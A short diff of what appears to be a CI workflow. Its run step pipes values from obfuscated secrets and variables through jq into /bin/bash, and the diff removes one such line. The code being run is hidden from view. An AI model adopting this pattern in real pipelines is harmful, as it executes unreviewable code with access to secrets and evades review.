@@ -18,7 +18,6 @@ jobs:
           be74: ${{ secrets.be74 }}
         run: |
           printf '%s' "$be74" | jq -r .qrz6549 | /bin/bash
-          echo $bu641 | jq -r .ja9 | /bin/bash
           printf '%s' "$zgkk8544" | jq -r .uane24 | /bin/bash
           echo $g782 | jq -r .yzqza46 | /bin/bash
 
